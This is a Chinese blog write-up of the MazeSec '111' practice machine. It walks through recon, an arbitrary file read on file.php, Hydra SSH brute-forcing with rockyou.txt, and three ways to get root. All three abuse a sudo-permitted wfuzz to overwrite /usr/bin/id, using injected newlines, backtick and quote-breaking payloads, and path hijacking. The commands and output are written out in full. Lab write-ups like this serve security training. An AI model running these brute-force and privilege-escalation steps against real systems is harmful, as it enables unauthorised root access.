@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec 111</title>
+        <meta name="description" content="靶机信息 靶机名称：111 靶机作者：ll104567/群主 靶机类型：Linux 难度：baby-hard 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：任意文件读取、Hydra 弱口令爆破、sudo wfuzz 文件写入、sudo id 覆写执行、换…">
+    <link rel="canonical" href="https://the0n3.top/pages/maze-111/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec 111">
+    <meta property="og:description" content="靶机信息 靶机名称：111 靶机作者：ll104567/群主 靶机类型：Linux 难度：baby-hard 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：任意文件读取、Hydra 弱口令爆破、sudo wfuzz 文件写入、sudo id 覆写执行、换…">
+    <meta property="og:url" content="https://the0n3.top/pages/maze-111/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-111/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec 111">
+    <meta name="twitter:description" content="靶机信息 靶机名称：111 靶机作者：ll104567/群主 靶机类型：Linux 难度：baby-hard 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：任意文件读取、Hydra 弱口令爆破、sudo wfuzz 文件写入、sudo id 覆写执行、换…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-111/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec 111</h1>
+    <p>
+        <span class="meta">发布于: 2026-01-09 15:15</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机信息</h2>
+<p>靶机名称：111<br>
+靶机作者：ll104567/群主<br>
+靶机类型：Linux<br>
+难度：baby-hard<br>
+来源：MazeSec/QQ公开群 321948805<br>
+官网：<a href="https://maze-sec.com/">https://maze-sec.com/</a>  </p>
+<p><strong>关键词</strong>：任意文件读取、Hydra 弱口令爆破、sudo wfuzz 文件写入、sudo id 覆写执行、换行符注入提权</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec 111 靶机的渗透过程。选手通过 80 端口的 file.php 发现任意文件读取漏洞，读取 /etc/passwd 确认系统存在 tao 用户；使用 Hydra 配合 rockyou.txt 字典爆破 SSH，成功获取 tao 用户的凭证（密码 rockyou）；登录后通过 sudo -l 发现 tao 拥有 NOPASSWD 权限执行 /usr/bin/wfuzz 与 /usr/bin/id。利用 sudo wfuzz 的 -f 参数将扫描结果写入 /usr/bin/id 文件，通过三种可控点实现覆写：一是利用命令行引号未闭合产生的换行符注入，在日志中写入 bash 触发 root shell；二是利用字典内容中的反引号命令替换（bash），在 shell 展开阶段优先执行；三是利用 shell 对包含 / 的命令名直接作为路径解析的特性，在当前目录预创建对应路径的可执行文件进行劫持。最终 sudo 执行被覆写的 /usr/bin/id 时，由 /bin/sh 按行解释该文本文件，在执行到 bash 所在行时启动 root 权限的 Shell，完成权限提升。该靶机重点考察了 sudo 二进制程序 wfuzz 的输出文件滥用、Linux shell 解析特性（换行注入、命令替换、路径解析）以及 sudo 配置缺陷导致的提权技巧。</p>
+<blockquote>
+<p>这是一台伪装为 baby 难度的 hard 靶机，root shell 才是终点。</p>
+</blockquote>
+<p>哈哈群主以我的 id 构建了一台群友 id 系列的靶机，酷！</p>
+<h2>存活主机发现与 ARP 扫描</h2>
+<p>使用 arp-scan 扫描内网存活主机：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test1]
+└─$ sudo arp-scan -I eth2 192.168.6.0/24
+
+192.168.6.215   08:00:27:5c:0a:80       PCS Systemtechnik GmbH</code></pre>
+<p>目标主机 IP：192.168.6.215</p>
+<h2>端口扫描</h2>
+<p>使用 nmap 进行 TCP 全端口扫描：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test1]
+└─$ nmap 192.168.6.215 -p- -sT -sV 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+53/tcp open  domain  (generic dns response: NOTIMP)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))</code></pre>
+<p>发现开放了 22/ssh、53/dns、80/http 三个端口。</p>
+<h2>80 端口服务探测</h2>
+<p>访问 80 端口，发现是一个 rockyou 字典的介绍页</p>
+<p><img src="/images/maze-111/1.png" alt="" decoding="async" width="1901" height="879"></p>
+<p>尝试 dirsearch 进行目录扫描</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test1]
+└─$ dirsearch -u http://192.168.6.215                 
+[22:56:40] 200 -    0B  - /file.php</code></pre>
+<p>发现了一个 file.php 页面，页面大小为 0 字节</p>
+<p>尝试使用 文件相关参数手动探测</p>
+<p>在使用 <code>file.php?file=/etc/passwd</code>时，发现页面返回了 /etc/passwd 的内容，说明存在任意文件读取漏洞，并且存在具有登录 shell 的用户 tao</p>
+<p><img src="/images/maze-111/2.png" alt="" decoding="async" loading="lazy" width="1920" height="675"></p>
+<h2>爆破 SSH 登录</h2>
+<p>使用 hydra 爆破 ssh 登录，用户名使用 tao，密码使用 rockyou 字典，很快就拿到了 tao 用户的密码 rockyou</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test1]
+└─$ hydra -l tao -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.6.215 -t 4 -v -I -e nsr
+
+[22][ssh] host: 192.168.6.215   login: tao   password: rockyou</code></pre>
+<p><img src="/images/maze-111/3.png" alt="" decoding="async" loading="lazy" width="1428" height="451"></p>
+<p>SSH 用户信息</p>
+<p>tao:rockyou</p>
+<h2>读取 root flag</h2>
+<p>用户 tao 具有两条 sudo 权限：</p>
+<pre><code class="language-bash">tao@111:~$ sudo -l
+Matching Defaults entries for tao on 111:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tao may run the following commands on 111:
+    (ALL) NOPASSWD: /usr/bin/wfuzz
+    (ALL) NOPASSWD: /usr/bin/id</code></pre>
+<p><img src="/images/maze-111/4.png" alt="" decoding="async" loading="lazy" width="1354" height="244"></p>
+<p>先说简单的 root flag 读取方案</p>
+<p>使用 sudo 执行 wfuzz 扫描一个 可控的 web 服务，把目标文件作为字典来扫描可控的 web 服务，从而读取目标文件内容</p>
+<pre><code class="language-bash">tao@111:~$ sudo wfuzz -w /root/root.txt -u http://192.168.6.101/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.6.101/FUZZ
+Total requests: 1
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                               
+=====================================================================
+
+000000001:   404        13 L     32 W       335 Ch      "flag{root-9bbd7af2a042a901b92dc203b3896621}"                                         
+
+Total time: 0
+Processed Requests: 1
+Filtered Requests: 0
+Requests/sec.: 0</code></pre>
+<p><img src="/images/maze-111/5.png" alt="" decoding="async" loading="lazy" width="1360" height="572"></p>
+<p>鸡系鸡系，下面才是精彩的提权部分</p>
+<h2>wfuzz 写入内容研究</h2>
+<p>wfuzz 的 <code>-h</code> 帮助信息靶机比较简练，使用 <code>--help</code> 查看完整帮助信息</p>
+<p><img src="/images/maze-111/6.png" alt="" decoding="async" loading="lazy" width="1738" height="745"></p>
+<p>重点在于 <code>-f</code> 参数，把扫描结果写入到输出文件里</p>
+<p>下面以读取 root flag 时的 流程与日志作为展示</p>
+<p><img src="/images/maze-111/demo1.png" alt="" decoding="async" loading="lazy" width="1533" height="595"></p>
+<p>这里便是写入的日志内容，重点放在这个日志内容上</p>
+<p><img src="/images/maze-111/demo2.png" alt="" decoding="async" loading="lazy" width="1415" height="405"></p>
+<p>通过观察，可以发现两处可控点：</p>
+<ul>
+<li>1、目标 URL</li>
+<li>2、字典内容</li>
+</ul>
+<p><img src="/images/maze-111/7.png" alt="" decoding="async" loading="lazy" width="1332" height="392"></p>
+<p>另外还有一种比较隐蔽的可控点，放最后讲，由此引出三种方案</p>
+<h3>方案一：111方案（换行符注入）</h3>
+<p>111方案：通过引号的闭合特性，即在命令行输入的引号不成对出现时直接回车，命令行会继续等待输入内容，直到闭合引号，因此可以在引号里构造出换行，从而向日志里写入可控内容</p>
+<p>可行性测试：</p>
+<p><img src="/images/maze-111/8.png" alt="" decoding="async" loading="lazy" width="1190" height="697"></p>
+<p><img src="/images/maze-111/9.png" alt="" decoding="async" loading="lazy" width="913" height="390"></p>
+<pre><code class="language-bash">tao@111:~$ sudo wfuzz -w /root/root.txt -f 1.txt -u 'http://192.168.6.101/FUZZ
+&gt; 1111
+&gt; '
+Target: http://192.168.6.101/FUZZ
+1111
+
+tao@111:~$ cat 1.txt
+Target: http://192.168.6.101/FUZZ
+1111
+</code></pre>
+<p>成功写入了可控内容 1111，我们可以利用这个可控日志去覆写另一个 sudo 授权文件 <code>/usr/bin/id</code></p>
+<p>利用：</p>
+<pre><code class="language-bash">tao@111:~$ sudo wfuzz -w /root/root.txt -f /usr/bin/id -u 'http://192.168.6.101/FUZZ
+bash
+'</code></pre>
+<p>验证：</p>
+<p><img src="/images/maze-111/12.png" alt="" decoding="async" loading="lazy" width="925" height="466"></p>
+<pre><code class="language-bash">tao@111:~$ cat /usr/bin/id
+Target: http://192.168.6.101/FUZZ
+bash
+
+
+tao@111:~$ sudo /usr/bin/id
+/usr/bin/id: 1: /usr/bin/id: Target:: not found
+root@111:/home/tao# </code></pre>
+<p>这里发生了什么细节？或者利用了什么特性？</p>
+<ul>
+<li>这个 id 文件是可执行文件</li>
+<li>当 sudo/ shell 尝试执行一个非 ELF 且无 shebang 的可执行文本文件时，底层 execve 返回 ENOEXEC，调用方通常会退回用 /bin/sh（或其指定的 shell）来解释执行该文件</li>
+<li>shell 环境执行命令 按行（句）解析，一行失败不会阻止后续行执行（除非启用了 set -e 等）</li>
+</ul>
+<blockquote>
+<p>什么是 shebang 行？在可执行文件第一行以 <code>#!</code> 开头的行，后面跟着解释器路径，比如 <code>#!/bin/bash</code>，表示用 /bin/bash 来解释执行该脚本文件</p>
+</blockquote>
+<p>因此 sudo 执行 /usr/bin/id 时，会由 /bin/sh（或 sudo 指定的 shell）按行解释该文本；执行到包含 bash 的那一行时，启动了一个 root 权限的 bash，从而获得 root shell</p>
+<p><strong>近期靶机推荐：Spiteful、Search、Meltdown</strong></p>
+<h3>方案二：垃圾堆方案</h3>
+<p>垃圾堆方案：在脏数据里找到可控点，尝试闭合、破坏原有结构（引号）达到命令注入，或者在不能闭合破坏原有结构下，找到 shell 特性利用点如命令替换</p>
+<p>这里又可以引出两种小方案：</p>
+<ul>
+<li>命令替换利用（shell展开阶段）</li>
+<li>双引号闭合利用（闭合原有结构）</li>
+</ul>
+<p><strong>命令替换利用（shell展开阶段）</strong></p>
+<p>利用 bash 执行一行命令前，shell 会先做各种展开，其中包括命令替换会被先执行，其输出再回填到该位置，属于展开阶段，执行发生在真正运行命令之前</p>
+<blockquote>
+<p>在双引号 " 里，真正能“提前执行命令”的，本质上只有「命令替换」，如`cmd`或<code>$(cmd)</code></p>
+</blockquote>
+<p>在 wfuzz 的输出文件中，对字典的内容添加了双引号</p>
+<p><img src="/images/maze-111/10.png" alt="" decoding="async" loading="lazy" width="1306" height="387"></p>
+<p>我们可以通过指定字典来控制双引号里的内容</p>
+<p>利用：</p>
+<pre><code class="language-bash">tao@111:~$ echo '`bash`' &gt; bash.txt
+tao@111:~$ cat bash.txt
+`bash`
+tao@111:~$ sudo wfuzz -w bash.txt -f /usr/bin/id -u http://192.168.6.101/FUZZ
+tao@111:~$ cat /usr/bin/id
+Target: http://192.168.6.101/FUZZ
+Total requests: 1
+==================================================================
+ID    Response   Lines      Word         Chars          Request    
+==================================================================
+00001:  C=404     13 L        32 W          335 Ch        "`bash`"
+
+Total time: 0
+Processed Requests: 1
+Filtered Requests: 0
+Requests/sec.: 0</code></pre>
+<p>验证：</p>
+<p><img src="/images/maze-111/11.png" alt="" decoding="async" loading="lazy" width="1403" height="561"></p>
+<p>这里发生了什么细节？或者利用了什么特性？</p>
+<ul>
+<li>这个 id 文件是可执行文件</li>
+<li>当 sudo/ shell 尝试执行一个非 ELF 且无 shebang 的可执行文本文件时，底层 execve 返回 ENOEXEC，调用方通常会退回用 /bin/sh（或其指定的 shell）来解释执行该文件。</li>
+<li>shell 环境执行命令 按行解析，shell 会先做各种展开，其中包括命令替换会被先执行，一行失败不会阻止后续行执行（除非启用了 set -e 等）</li>
+</ul>
+<p>因此 sudo 执行 /usr/bin/id 时，会由 /bin/sh（或 sudo 指定的 shell）按行解释该文本；执行到包含 bash 的那一行时，启动了一个 root 权限的 bash，从而获得 root shell</p>
+<p><strong>关于 命令替换 时没有回显的解释</strong></p>
+<p>在命令替换（如 <code>bash</code> 或 $(bash)）中，父 shell 会 fork 一个子进程执行被替换的命令。子进程的标准输出会被重定向到一个管道中，由父 shell 在子进程结束后读取全部输出，并将其作为字符串插入到原命令位置。由于 stdout 不再连接到终端，而是管道，子进程无法实时回显输出。命令替换只捕获 stdout，stderr 仍然连接到终端，因此将输出重定向到 stderr 可以立即看到。</p>
+<p>这里的 <code>bash</code> 实际上会捕获子进程的所有标准输出，在 子进程使用<code>exit</code>结束进程时替换掉 <code>bash</code>，所以实际上执行的是子进程的标准输出 <code>111</code>，而子进程执行过程遇到的错误会直接输出到终端</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ `bash`
+┌──(npc㉿kali)-[~]
+└─$ 111
+111：未找到命令
+┌──(npc㉿kali)-[~]
+└─$ echo '111'
+┌──(npc㉿kali)-[~]
+└─$ exit
+exit
+111：未找到命令</code></pre>
+<p><img src="/images/maze-111/18.png" alt="" decoding="async" loading="lazy" width="655" height="338"></p>
+<p>把标准输出重定向到标准错误，就能看到回显了</p>
+<p><img src="/images/maze-111/19.png" alt="" decoding="async" loading="lazy" width="425" height="291"></p>
+<p><strong>双引号闭合利用（闭合原有结构）</strong></p>
+<p>这里的双引号也是可以闭合的</p>
+<pre><code class="language-bash">tao@111:~$ echo '";bash;#' &gt; bash.txt
+tao@111:~$ cat bash.txt
+";bash;#
+tao@111:~$ sudo wfuzz -w bash.txt -f /usr/bin/id -u http://192.168.6.101/FUZZ
+tao@111:~$ cat /usr/bin/id
+Target: http://192.168.6.101/FUZZ
+Total requests: 1
+==================================================================
+ID    Response   Lines      Word         Chars          Request    
+==================================================================
+00001:  C=404     13 L        32 W          335 Ch        "";bash;#"
+
+Total time: 0
+Processed Requests: 1
+Filtered Requests: 0
+Requests/sec.: 0</code></pre>
+<p><strong>近期靶机推荐：React</strong></p>
+<h3>方案三：ta0方案（路径解析利用）</h3>
+<p>ta0 方案：当 shell 解析一行命令时，如果“命令名”中包含 /，shell 不会再走 $PATH 查找，而是直接把它当成路径执行。</p>
+<p>因此，只要：</p>
+<ul>
+<li>当前目录可控</li>
+<li>可以提前构造对应目录及可执行文件</li>
+</ul>
+<p>就可能劫持日志中的某一行执行。</p>
+<p>当 shell 解析一行命令时：</p>
+<pre><code class="language-bash">command arg1 arg2</code></pre>
+<p>shell 会把：第一个 token (command)，视为要执行的命令，后面的内容视为参数</p>
+<p>如果第一个 token 中包含 /：</p>
+<pre><code class="language-bash">a/b c</code></pre>
+<p>shell 不会去 $PATH 中查找，而是直接把它当成一个文件路径执行。</p>
+<pre><code class="language-bash"># 会被当成路径执行
+a/b c
+
+# b/c 只是参数
+a b/c</code></pre>
+<p>因此，如果我们能控制当前目录，并提前构造对应路径和可执行文件，就可能让日志中的某一行被 shell 当成命令执行。</p>
+<p>满足以下条件时适用：</p>
+<ul>
+<li><code>/</code> 不作为一行字符的开头</li>
+<li><code>/</code> 出现在第一个空格前</li>
+</ul>
+<p>同样以这个读取 root flag日志作为演示：</p>
+<p><img src="/images/maze-111/13.png" alt="" decoding="async" loading="lazy" width="1283" height="386"></p>
+<p>图中出现了两次 <code>/</code> 字符，分别是目标主机url <code>http://192.168.6.101/FUZZ</code> 和 <code>Requests/sec.: 0</code>这一行</p>
+<p>以利用<code>Requests/sec.: 0</code>这一行为演示：</p>
+<p>shell 会把 <code>Requests/sec.:</code> 视为命令路径，把 <code>0</code> 作为参数传入。我们创建 <code>Requests/sec.:</code> 这个可执行文件，内容为 <code>bash</code>就好了</p>
+<pre><code class="language-bash">tao@111:~$ mkdir -p Requests
+tao@111:~$ echo 'bash' &gt; Requests/'sec.:'
+tao@111:~$ chmod +x Requests/sec.\:
+tao@111:~$ cat /usr/bin/id
+Target: http://192.168.6.101/FUZZ
+Total requests: 1
+==================================================================
+ID    Response   Lines      Word         Chars          Request    
+==================================================================
+00001:  C=404     13 L        32 W          335 Ch        "flag{root-9bbd7af2a042a901b92dc203b3896621}"
+
+Total time: 0
+Processed Requests: 1
+Filtered Requests: 0
+Requests/sec.: 0
+tao@111:~$ sudo /usr/bin/id
+
+root@111:/home/tao# </code></pre>
+<p><img src="/images/maze-111/14.png" alt="" decoding="async" loading="lazy" width="1376" height="757"></p>
+<p>同样可以利用 <code>http://192.168.6.101/FUZZ</code>这个目标 Url，需要注意的是，这个 URL 前面有了脏数据，控制一下这个 URL ，前面构造一个分号，从而避开脏数据的影响：</p>
+<pre><code class="language-bash">tao@111:~$ mkdir -p http://192.168.6.101/
+tao@111:~$ echo 'bash' &gt; http://192.168.6.101/FUZZ
+tao@111:~$ chmod +x http://192.168.6.101/FUZZ
+tao@111:~$ sudo wfuzz -w bash.txt -f /usr/bin/id -u ';http://192.168.6.101/FUZZ'
+tao@111:~$ cat /usr/bin/id
+Target: http://192.168.6.101/FUZZ
+Total requests: 1
+==================================================================
+ID    Response   Lines      Word         Chars          Request    
+==================================================================
+00001:  C=404     13 L        32 W          335 Ch        "flag{root-9bbd7af2a042a901b92dc203b3896621}"
+
+Total time: 0
+Processed Requests: 1
+Filtered Requests: 0
+Requests/sec.: 0
+tao@111:~$ sudo /usr/bin/id
+
+root@111:/home/tao# </code></pre>
+<p><img src="/images/maze-111/15.png" alt="" decoding="async" loading="lazy" width="1677" height="861"></p>
+<p><img src="/images/maze-111/16.png" alt="" decoding="async" loading="lazy" width="1002" height="476"></p>
+<p>这里实际上是在 shell 里执行，如果其他命令分隔符会原样拼接进去的话，也可以尝试，例如 <code>&amp;</code>、<code>|</code> 或命令替换等等 shell 环境的玩法</p>
+<p><strong>近期靶机推荐：dan</strong></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#wfuzz</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
